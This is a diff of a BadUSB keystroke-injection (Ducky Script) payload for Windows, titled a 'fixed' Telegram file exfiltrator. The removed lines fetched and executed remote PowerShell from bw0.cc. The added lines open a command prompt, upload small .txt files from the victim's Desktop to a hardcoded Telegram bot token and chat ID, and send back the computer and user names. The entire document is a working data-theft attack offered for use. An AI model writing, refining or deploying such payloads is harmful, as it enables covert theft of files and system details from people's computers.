@@ -1,19 +1,24 @@
+REM Telegram File Exfiltrator - Fixed
+REM Target: Windows 10/11
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DELAY 4000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+DELAY 800
+STRING cmd
+DELAY 400
 ENTER
+DELAY 1000
 
+REM Stage 1: Start message
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=Start"
+ENTER
+DELAY 2000
+
+REM Stage 2: Send files (PowerShell version)
+STRING powershell -c "cd ~/Desktop; Get-ChildItem *.txt -ErrorAction 0 | ForEach-Object { if($_.Length -lt 5MB) { curl.exe -F chat_id=6614794141 -F document=@`"$($_.FullName)`" 'https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument'; Start-Sleep -Milliseconds 1000 } }"
+ENTER
+DELAY 3000
+
+REM Stage 3: Send system info
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=PC%3A%20$env:COMPUTERNAME%20User%3A%20$env:USERNAME"
+ENTER
